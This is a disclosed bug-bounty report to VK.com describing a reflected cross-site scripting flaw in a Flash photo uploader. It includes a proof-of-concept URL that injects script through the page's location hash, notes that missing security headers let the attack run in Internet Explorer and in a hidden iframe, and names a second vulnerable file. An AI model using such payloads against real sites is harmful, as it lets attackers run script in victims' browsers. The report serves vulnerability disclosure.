@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/66121
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/tunnelshade
+ReportedTo:VK.com(vkcom)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:30.10.2015 12:23:19
+
+Summary:
+
+**Steps**
+
++ Open the below url in **Internet Explorer**
+ 
+```
+http://vk.com/swf/photo_uploader_lite.swf?h=h?&onMouseOver=document.write(window.location.hash.substr(1))#<script>alert(document.domain)</script>
+```
+
++ Just hover your mouse over the page.
+
+**Minor Observations**
+
++ No "X-Content-Type-Options: nosniff" header allows IE to play the flash file directly whereas other browsers present download dialog as the content type served is **application/zip**.
++ No X-Frame options will allow this attack to be placed inside an iframe and run stealthily.
++ Other flash files such as **http://vk.com/swf/CaptureImg.swf** will also be vulnerable in a similar fashion.
